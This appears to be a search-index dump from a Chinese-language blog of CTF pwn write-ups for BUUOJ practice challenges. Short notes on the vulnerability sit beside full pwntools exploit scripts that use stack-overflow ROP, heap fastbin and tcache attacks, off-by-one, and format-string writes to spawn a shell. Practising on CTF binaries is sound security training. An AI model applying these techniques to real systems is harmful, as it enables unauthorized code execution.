r.interactive()","categories":[],"tags":[]},{"title":"level4","slug":"level4","date":"2024-03-14T06:50:21.000Z","updated":"2024-03-14T07:27:10.251Z","comments":true,"path":"2024/03/14/level4/","link":"","permalink":"http://example.com/2024/03/14/level4/","excerpt":"","text":"只开了NX保护，32位栈溢出。 elf = ELF(proc_name) write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#39;write&#39;] main_addr = elf.sym[&#39;main&#39;] payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4) 没调用write函数前 got表存的是寻址的地址跳转到write_got存的地址write_plt+6 总结起来就是，没调用write函数之前，write_got存的是write_plt+6这个地址，然后执行write_plt会去write_got里找write函数真正的地址，此时会执行write_plt+6这个地址寻址，找到write函数真正的地址后会把它存入write_got. expfrom pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; proc_name = &#39;./level4&#39; p = process(proc_name) #p=remote(&#39;node5.buuoj.cn&#39;,29402) elf = ELF(proc_name) write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#39;write&#39;] main_addr = elf.sym[&#39;main&#39;] payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4) gdb.attach(p) sleep(1) p.send(payload) write_addr = u32(p.recv(4)) print(hex(write_addr)) #libc = LibcSearcher(&#39;write&#39;, write_addr) libc=ELF(&#39;./libc-2.23_32.so&#39;) libc_base = write_addr - libc.sym[&#39;write&#39;] system_addr = libc_base + libc.sym[&#39;system&#39;] str_bin_sh = libc_base + next(libc.search(b&#39;bin/sh&#39;)) payload1 = b&#39;a&#39; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr) + p32(str_bin_sh) p.send(payload1) p.interactive()","categories":[],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2024-03-13T11:11:48.000Z","updated":"2024-03-14T06:27:37.456Z","comments":true,"path":"2024/03/13/babyheap-0ctf-2017/","link":"","permalink":"http://example.com/2024/03/13/babyheap-0ctf-2017/","excerpt":"","text":"保护全开 malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。 尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。 改掉了bin指针 堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。 在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget. expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,26041) p=process(&quot;./babyheap_0ctf_2017&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;,os=&#39;linux&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) def add(size): p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def full(index,size,content): p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Size: &#39;,str(size)) p.sendlineafter(&#39;Content: &#39;,content) def free(index): p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) def show(index): p.sendlineafter(&#39;Command: &#39;,&#39;4&#39;) p.sendlineafter(&#39;Index:&#39;,str(index)) add(0x10) #0 add(0x10) #1 add(0x10) #2 add(0x10) #3 add(0x80) #4 free(1) free(2) payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x20)+p8(0x80) full(0,0x41,payload) payload=p64(0)*3+p64(0x21) full(3,0x20,payload) add(0x10) #1 add(0x10) #2--&gt;4 payload=p64(0)*3+p64(0x91) full(3,0x20,payload) add(0x30) #防止合并 free(4) show(2) p.recvuntil(&quot;Content:&quot;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-88 print(hex(main_addr)) base=main_addr-0x10-libc.sym[&#39;__malloc_hook&#39;] system=base+libc.sym[&#39;system&#39;] add(0x60) #4 free(4) fake_addr=main_addr-0x10-0x23 full(2,0x8,p64(fake_addr)) &#39;&#39;&#39; or payload=p64(0)*3+p64(0x71)+p64(fake_addr) full(3,0x28,payload) &#39;&#39;&#39; gdb.attach(p) sleep(1) add(0x60) #5 add(0x60) #6 one=[0x45216,0x4526a,0xf02a4,0xf1147] one_gadget=base+one[1] payload=b&#39;a&#39;*0x13+p64(one_gadget) full(6,0x1b,payload) add(0x10) p.interactive()","categories":[],"tags":[]},{"title":"SWPUCTF_2019_login","slug":"SWPUCTF-2019-login","date":"2024-03-12T12:48:45.000Z","updated":"2024-03-13T11:10:59.577Z","comments":true,"path":"2024/03/12/SWPUCTF-2019-login/","link":"","permalink":"http://example.com/2024/03/12/SWPUCTF-2019-login/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"STKOF","slug":"stkof","date":"2024-03-11T12:53:15.000Z","updated":"2024-03-16T14:10:03.790Z","comments":true,"path":"2024/03/11/stkof/","link":"","permalink":"http://example.com/2024/03/11/stkof/","excerpt":"","text":"两道程序题，一道32位一道64位，都是栈溢出的题","categories":[],"tags":[]},{"title":"b00ks","slug":"b00ks","date":"2024-03-11T06:17:34.000Z","updated":"2024-03-11T08:25:17.302Z","comments":true,"path":"2024/03/11/b00ks/","link":"","permalink":"http://example.com/2024/03/11/b00ks/","excerpt":"","text":"甩到脸上的off-by-one 是一个图书管理系统 这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作 打印的时候会连堆地址也打印出来 add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) add(0x10,&#39;eeeeeeee&#39;,0x10,&#39;ffffffff&#39;) free(2) edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20)) expfrom pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,25494) #p=process(&quot;./b00ks&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) elf=ELF(&#39;./b00ks&#39;) payload=b&#39;k&#39;*0x1f+b&#39;b&#39; p.sendlineafter(&#39;Enter author name: &#39;,payload) def add(size1,content1,size2,content2): p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Enter book name size:&#39;,str(size1)) p.sendlineafter(&#39;Enter book name (Max 32 chars):&#39;,content1) p.sendlineafter(&#39;Enter book description size:&#39;,str(size2)) p.sendlineafter(&#39;Enter book description:&#39;,content2) def edit(idd,content): p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Enter the book id you want to edit: &#39;,str(idd)) p.sendlineafter(&#39;Enter new book description: &#39;,content) def show(): p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;) def free(idd): p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Enter the book id you want to delete: &#39;,str(idd)) def ren(content): p.sendlineafter(&#39;&gt; &#39;,&#39;5&#39;) p.sendlineafter(&#39;Enter author name: &#39;,content) add(0xd0,&#39;aaaaaaaa&#39;,0x20,&#39;bbbbbbb&#39;) #1 show() p.recvuntil(&quot;kb&quot;) heap_addr=u64(p.recv(6)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;addr&#39;+hex(heap_addr)) add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) #2 add(0x10,&#39;bin/sh&#39;,0x10,&#39;ffffffff&#39;) #3 free(2) edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20)) ren(&#39;a&#39;*0x20) show() p.recvuntil(&#39;Name: &#39;) main_addr=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;))-88 malloc_hook=main_addr-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] system=base+libc.sym[&#39;system&#39;] print(&#39;main_addr&#39;+hex(main_addr)) edit(1,p64(free_hook)+p64(0x20)) edit(3,p64(system)) free(3) #gdb.attach(p) sleep(1) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"freenote_x64","slug":"freenote-x64","date":"2024-03-10T12:50:45.000Z","updated":"2024-03-10T13:14:09.298Z","comments":true,"path":"2024/03/10/freenote-x64/","link":"","permalink":"http://example.com/2024/03/10/freenote-x64/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"jiandan_pwn1","slug":"jiandan-pwn1","date":"2024-03-09T09:02:00.000Z","updated":"2024-03-09T12:52:23.494Z","comments":true,"path":"2024/03/09/jiandan-pwn1/","link":"","permalink":"http://example.com/2024/03/09/jiandan-pwn1/","excerpt":"","text":"一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32(0x10d),0d先放在左边(\\x61)的位置，然后把值放到rsp+0x10d的位置，后面的输入也不影响v4的值。 expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,27841) p=process(&quot;./jiandan_pwn1&quot;) context.log_level=&quot;debug&quot; puts_func=0x4007BF puts_plt=0x400590 puts_got=0x601018 pop_rdi=0x400843 libc=ELF(&#39;./libc-2.23.so&#39;) gdb.attach(p,&#39;b *0x400783&#39;) sleep(1) payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_func) p.sendlineafter(&#39;Hack 4 fun!&#39;,payload) puts_got=u64(p.recvuntil(&#39;\\x7f&#39;).strip().ljust(8,b&#39;\\x00&#39;)) base=puts_got-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) print(&#39;puts&#39;+hex(puts_got)) # payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"mergeheap","slug":"mergeheap","date":"2024-03-08T12:47:52.000Z","updated":"2024-03-09T07:39:30.617Z","comments":true,"path":"2024/03/08/mergeheap/","link":"","permalink":"http://example.com/2024/03/08/mergeheap/","excerpt":"","text":"保护全开，libc-2.27,malloc大小限制了0x400，有个合并堆的函数，可以合并大于0x400的，不过释放的时候总是和top_chunk合并。所以得用另一种方法泄露libc. add(0x210,&#39;aaaa&#39;) add(0x210,&#39;cccc&#39;) add(0x10,&#39;dddd&#39;) merge(0,1) free(3) free(2) 这种方法好像不行for i in range(8): add(0x80,&#39;cccc&#39;) for i in range(1,8): free(i) free(0) add(0x8,&#39;cccccccc&#39;) show(0) p.recvuntil(&#39;cccccccc&#39;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) add(0x60,&#39;aaaa\\n&#39;) #1 add(0x30,&#39;a&#39;*0x30) #2 add(0x38,&#39;a&#39;*0x38) #3 add(0x100,&#39;a&#39;) #4 add(0x68,&#39;a&#39;) #5 add(0x20,&#39;a&#39;) #6 add(0x20,&#39;c&#39;) #7 add(0x20,&#39;f&#39;) #8 add(0x20,&#39;d&#39;) #9 free(5) free(7) free(8) merge(2,3) 下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂 free(6) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,25860) p=process(&quot;./mergeheap&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) def add(size,content): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;len:&#39;,str(size)) p.sendlineafter(&#39;content:&#39;,content) def show(index): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;) p.sendlineafter(&#39;idx:&#39;,str(index)) def free(index): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;) p.sendlineafter(&#39;idx:&#39;,str(index)) def merge(index1,index2): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;) p.sendlineafter(&#39;idx1:&#39;,str(index1)) p.sendlineafter(&#39;idx2:&#39;,str(index2)) for i in range(8): add(0x80,&#39;cccc&#39;) for i in range(1,8): free(i) free(0) add(0x8,&#39;cccccccc&#39;) show(0) p.recvuntil(&#39;cccccccc&#39;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(main_addr-0x80)) main_arena=main_addr-96-0x80 malloc=main_arena-0x10 base=malloc-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] one=[0x4f2c5,0x4f322,0x10a38c] one_gadget=base+one[1] add(0x60,&#39;aaaa\\n&#39;) #1 add(0x30,&#39;a&#39;*0x30) #2 add(0x38,&#39;a&#39;*0x38) #3 add(0x100,&#39;a&#39;) #4 add(0x68,&#39;a&#39;) #5 add(0x20,&#39;a&#39;) #6 add(0x20,&#39;c&#39;) #7 add(0x20,&#39;f&#39;) #8 add(0x20,&#39;d&#39;) #9 free(5) free(7) free(8) merge(2,3) free(6) payload=b&#39;a&#39;*0x28+p64(0x31)+p64(free_hook)+p64(0) add(0x100,payload) add(0x20,&#39;aaaa&#39;) add(0x20,&#39;cccc&#39;) add(0x20,p64(one_gadget)) free(9) #gdb.attach(p) sleep(1) p.interactive()","categories":[],"tags":[]},{"title":"bbctf_2020_write","slug":"bbctf-2020-write","date":"2024-03-08T11:12:10.000Z","updated":"2024-03-08T12:19:12.523Z","comments":true,"path":"2024/03/08/bbctf-2020-write/","link":"","permalink":"http://example.com/2024/03/08/bbctf-2020-write/","excerpt":"","text":"可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。为了以后方便，以后就这样算在libc-2.23中exit_hook = libc_base+0x5f0040+3848 exit_hook = libc_base+0x5f0040+3856 在libc-2.27中 exit_hook = libc_base+0x619060+3840 exit_hook = libc_base+0x619060+3848具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式exit_hook在pwn题中的应用](http://www.manongjc.com/detail/21-aktzmrsypltrrll.html)) from pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,29131) #p=process(&quot;./bbctf_2020_write&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) p.recvuntil(&#39;puts: &#39;) puts_addr=int(p.recv(14),16) base=puts_addr-libc.sym[&#39;puts&#39;] print(&#39;put&#39;+hex(puts_addr)) p.sendline(&#39;w&#39;) exit_hook=base++0x619060+3848 one=[0x4f2c5,0x4f322,0x10a38c] one_gadget=one[1]+base p.sendlineafter(&#39;ptr: &#39;,str(exit_hook)) p.sendlineafter(&#39;val: &#39;,str(one_gadget)) p.sendlineafter(&#39;(q)uit&#39;,&#39;q&#39;) #gdb.attach(p) #sleep(1) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_c_5","slug":"ciscn-2019-c-5","date":"2024-03-08T04:49:05.000Z","updated":"2024-03-08T07:13:56.626Z","comments":true,"path":"2024/03/08/ciscn-2019-c-5/","link":"","permalink":"http://example.com/2024/03/08/ciscn-2019-c-5/","excerpt":"","text":"保护全开 有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8 p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;) p.recvuntil(&#39;59&#39;) io_stder=int(p.recv(14),16) 接收的话不是p.recvuntil(‘\\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误 这里对应第七个参数 expfrom pwn import * p=process(&#39;./ciscn_2019_c_5&#39;) #p=remote(&#39;node5.buuoj.cn&#39;,28941) elf=ELF(&#39;./ciscn_2019_c_5&#39;) libc=elf.libc def add(size,story): p.sendlineafter(&#39;:&#39;,&#39;1&#39;) p.sendlineafter(&#39;story:&#39;,str(size)) p.sendlineafter(&#39;story:&#39;,story) def edit(): p.sendlineafter(&#39;:&#39;,&#39;2&#39;) def show(): p.sendlineafter(&#39;:&#39;,&#39;3&#39;) def free(idx): p.sendlineafter(&#39;:&#39;,&#39;4&#39;) p.sendlineafter(&#39;index:&#39;,str(idx)) def debug(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;) p.recvuntil(&#39;59&#39;) debug() io_stder=int(p.recv(14),16)#.ljust(8,b&#39;\\x00&#39;) p.sendlineafter(&#39;input your ID.&#39;,&#39;kkkk&#39;) base=io_stder-libc.sym[&#39;_IO_2_1_stderr_&#39;] system=base+libc.sym[&#39;system&#39;] print(&#39;io_st &#39;+hex(io_stder)+&#39;system &#39;+hex(system)) free_hook=base+libc.sym[&#39;__free_hook&#39;] add(0x60,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 add(0x60,&#39;bin/sh\\n&#39;) #2 free(0) free(1) free(0) add(0x60,p64(free_hook)) #3 add(0x60,&#39;aaaa&#39;) #4 add(0x60,&#39;dddd&#39;) #5 add(0x60,p64(system)) free(2) # p.interactive()","categories":[],"tags":[]},{"title":"starctf_2019_girlfriend","slug":"starctf-2019-girlfriend","date":"2024-03-06T13:48:39.000Z","updated":"2024-03-07T12:14:31.830Z","comments":true,"path":"2024/03/06/starctf-2019-girlfriend/","link":"","permalink":"http://example.com/2024/03/06/starctf-2019-girlfriend/","excerpt":"","text":"保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行 from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./starctf_2019_girlfriend&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def add(size,content1,content2): p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.sendlineafter(&quot;girl&#39;s name&quot;,str(size)) p.sendlineafter(&#39;please inpute her name:&#39;,content1) p.sendlineafter(&#39;please input her call:&#39;,content2) def show(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) def free(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) free(0) free(1) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-88 base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] system=base+libc.sym[&#39;system&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] add(0x20,&#39;dddd&#39;,&#39;eeee&#39;) add(0x20,&#39;/bin/sh&#39;,&#39;cccc&#39;) print(&#39;main_arena&#39;+hex(main_arena)) free(2) #2 free(3) #3 free(2) gdb.attach(p) sleep(1) add(0x20,p64(free_hook-0x10),&#39;dddd&#39;) add(0x20,&#39;cccc&#39;,&#39;dddd&#39;) add(0x20,&#39;eeee&#39;,&#39;vvvv&#39;) add(0x20,p64(system),&#39;dddd&#39;) p.interactive() 首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x60,&#39;cccc&#39;,&#39;ssss&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) free(0) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;main_arena&#39;+hex(main_arena)) malloc_hook=main_arena-88-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free(2) free(1) free(2) one = [0x45226, 0x4527a, 0xf03a4, 0xf1147] one_gadget=base+one[3] realloc=libc.sym[&#39;realloc&#39;]+base #这里的话得用到 realloc_hook=malloc_hook-0x8add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23)) add(0x60,&#39;cccc&#39;,&#39;dddd&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39; malloc=&#39;+hex(malloc_hook-0x23)+&#39; realloc=&#39;+hex(realloc)) payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2) add(0x60,payload,&#39;cccc&#39;) 使用one_gadget的条件 关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址链接文本) 调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行 expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,25861) p=process(&quot;./starctf_2019_girlfriend&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def debug(): gdb.attach(p) sleep(1) def add(size,content1,content2): p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.sendlineafter(&quot;girl&#39;s name&quot;,str(size)) p.sendlineafter(&#39;please inpute her name:&#39;,content1) p.sendlineafter(&#39;please input her call:&#39;,content2) def show(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) def free(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) #add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x60,&#39;cccc&#39;,&#39;ssss&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) free(0) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;main_arena&#39;+hex(main_arena)) malloc_hook=main_arena-88-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free(2) free(1) free(2) one = [0x45226, 0x4527a, 0xf03a4, 0xf1147] one_gadget=base+one[3] realloc=libc.sym[&#39;realloc&#39;]+base add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23)) add(0x60,&#39;cccc&#39;,&#39;dddd&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39; malloc-0x23=&#39;+hex(malloc_hook-0x23)+&#39; realloc=&#39;+hex(realloc)) payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2) add(0x60,payload,&#39;cccc&#39;) debug() p.sendafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.interactive()","categories":[],"tags":[]},{"title":"ACTF_2019_message","slug":"ACTF-2019-message","date":"2024-03-05T11:24:11.000Z","updated":"2024-03-06T11:35:37.365Z","comments":true,"path":"2024/03/05/ACTF-2019-message/","link":"","permalink":"http://example.com/2024/03/05/ACTF-2019-message/","excerpt":"","text":"有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf add(0x200,&#39;aaaa&#39;) add(0x200,&#39;aaaa&#39;) free(0) free(0) add(0x200,p64(0x60204c)) add(0x200,&#39;aaaa&#39;) 成功控制堆指针 payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20 add(0x200,payload) for i in range(8): add(0x80,&#39;aaaa&#39;) #8 for i in range(1,7): free(i) free(8) add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并free(7) 堆7指针是main_arena+96 我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的地址出错 payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*12+p64(0x80) edit(0,payload) show(7) 这里因为用sendline所以出错了 或者用师傅的做法，不过我的更简单 edit(0,payload) for i in range(7): add(0x80,&#39;aaaa&#39;) add(0x8,&#39;aaaaaaa&#39;) #堆8，会在unsorted bin里拿 show(8) r.recvuntil(&#39;The message: aaaaaaa&#39;) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-224 #这里减0x80再减96 #libc2.23和2.27都是__malloc_hook=main_arena-0x10 print(&#39;main_&#39;+hex(main_arena)) base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook) edit(0,payload) edit(2,p64(system)) 最后有个地方就是free(1)会报错，得分开或者手动 exp from pwn import* from LibcSearcher import * #r=remote(&quot;node5.buuoj.cn&quot;,29647) r=process(&quot;./ACTF_2019_message&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) elf=ELF(&#39;./ACTF_2019_message&#39;) def choice(nu): r.sendlineafter(&#39;choice: &#39;, str(nu)) def add(size,content): choice(1) r.sendlineafter(&#39;length of message:\\n&#39;, str(size)) r.sendlineafter(&#39;input the message:\\n&#39;, content) def free(idx): choice(2) r.sendlineafter(&#39;you want to delete:\\n&#39;, str(idx)) def edit(idx, content): choice(3) r.sendlineafter(&#39;you want to edit:\\n&#39;, str(idx)) r.sendlineafter(&#39;edit the message:\\n&#39;, content ) def show(idx): choice(4) r.sendlineafter(&#39;want to display:\\n&#39;, str(idx)) add(0x200,&#39;aaaa&#39;) #0 add(0x200,&#39;aaaa&#39;) #1 free(0) free(0) add(0x200,p64(0x60204c)) add(0x200,&#39;aaaa&#39;) payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20 add(0x200,payload) #0 for i in range(8): add(0x80,&#39;aaaa&#39;) #8 for i in range(1,7): free(i) free(8) free(7) edit(0,payload) for i in range(7): add(0x80,&#39;aaaa&#39;) add(0x10,&#39;aaaaaaa&#39;) show(8) r.recvuntil(&#39;The message: aaaaaaa&#39;) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-224 print(&#39;main_&#39;+hex(main_arena)) base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+ next(libc.search(b&#39;/bin/sh&#39;)) print(hex(system)) payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook) edit(0,payload) edit(2,p64(system)) #gdb.attach(r) #sleep(1) r.sendlineafter(&#39;choice: &#39;,&#39;2&#39;) r.sendlineafter(&#39;you want to delete:\\n&#39;,&#39;1&#39;) # 有时候得手动free(1),不然打不通，很离谱 #free(1) r.interactive()","categories":[],"tags":[]},{"title":"ACTF_2019_OneRepeater","slug":"ACTF-2019-OneRepeater","date":"2024-03-02T08:13:15.000Z","updated":"2024-03-02T17:45:47.653Z","comments":true,"path":"2024/03/02/ACTF-2019-OneRepeater/","link":"","permalink":"http://example.com/2024/03/02/ACTF-2019-OneRepeater/","excerpt":"","text":"有可读可写可执行段，是道格式化字符串题，用shellcode做 1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr=0x408+0x10+4 exp from pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,29221) #p=process(&quot;./ACTF_2019_OneRepeater&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;) offset=16 p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;) p.recvline() addr = int(p.recv(8).strip(), 16) ret_addr=addr+0x418+4 print(&#39;addr&#39;+hex(addr)) &#39;&#39;&#39; payload=p32(ret_addr)+b&#39;%&#39;+str(addr%65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39; p.sendline(payload) p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;) p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;) payload=p32(ret_addr+2)+b&#39;%&#39;+str(addr//65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39; p.sendline(payload) &#39;&#39;&#39; payload=p32(ret_addr)+p32(ret_addr+2)+b&#39;%&#39;+str(addr%65536-8).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;+b&#39;%&#39;+str(addr//65536-addr%65536).encode()+b&#39;c%17$hn&#39; p.sendline(payload) p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;) p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;) #gdb.attach(p) sleep(1) p.sendline(asm(shellcraft.sh())) p.sendlineafter(&#39;3) Exit&#39;,&#39;3&#39;) 